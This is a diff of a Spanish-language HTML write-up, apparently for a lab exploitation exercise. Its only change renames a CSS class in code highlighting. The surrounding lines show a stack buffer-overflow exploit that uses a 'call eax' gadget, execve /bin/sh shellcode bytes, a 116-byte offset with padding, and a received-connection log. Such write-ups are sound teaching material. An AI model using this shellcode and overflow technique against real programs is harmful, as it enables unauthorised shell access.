@@ -1297,7 +1297,7 @@ JMP Instructions
 
 <p class="plain-text">Cualquiera de las 2 direcciones para <code class="language-plaintext highlighter-rouge">call eax</code> es válida pero hay que pasarla a formato <code class="language-plaintext highlighter-rouge">little endian</code>, como no tenemos <code class="language-plaintext highlighter-rouge">pwntools</code> en la maquina crearemos una funcion llamada <code class="language-plaintext highlighter-rouge">p32</code> usando el propio atributo <code class="language-plaintext highlighter-rouge">.to_bytes()</code> para convertirla</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">p32 </span><span class="o">= lambda</span><span class="am"> addr</span><span class="p">: addr.to_bytes(</span><span class="mi">4</span><span class="p">,</span><span class="s"> "little"</span><span class="p">)  </span>
+<code><span class="p">p32 </span><span class="o">= lambda</span><span class="ra"> addr</span><span class="p">: addr.to_bytes(</span><span class="mi">4</span><span class="p">,</span><span class="s"> "little"</span><span class="p">)  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Iniciamos con un <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/shellcode/bin_sh.asm">shellcode</a> el cual nos ejecutara una <code class="language-plaintext highlighter-rouge">/bin/sh</code>, rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al return address, en el ejecutaremos el <code class="language-plaintext highlighter-rouge">call eax</code> que llama al inicio del buffer y como en el inicio enviamos el shellcode se ejecutará y nos dará la shell</p>
@@ -1305,7 +1305,7 @@ JMP Instructions
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">import</span><span class="p"> sys
 
-p32</span><span class="o"> = lambda</span><span class="am"> addr</span><span class="p">: addr.to_bytes(</span><span class="mi">4</span><span class="p">,</span><span class="s"> "little"</span><span class="p">)
+p32</span><span class="o"> = lambda</span><span class="ra"> addr</span><span class="p">: addr.to_bytes(</span><span class="mi">4</span><span class="p">,</span><span class="s"> "little"</span><span class="p">)
 
 shellcode</span><span class="o"> =</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6a\x0b\x58\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x99\xcd\x80</span><span class="s">"  </span><span class="p">
 
@@ -1377,7 +1377,7 @@ Connection received on 10.10.27.47  </span>
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">import</span><span class="p"> sys
 
-p32</span><span class="o"> = lambda</span><span class="am"> addr</span><span class="p">: addr.to_bytes(</span><span class="mi">4</span><span class="p">,</span><span class="s"> "little"</span><span class="p">)
+p32</span><span class="o"> = lambda</span><span class="ra"> addr</span><span class="p">: addr.to_bytes(</span><span class="mi">4</span><span class="p">,</span><span class="s"> "little"</span><span class="p">)
 
 offset</span><span class="o"> =</span><span class="mi"> 116</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
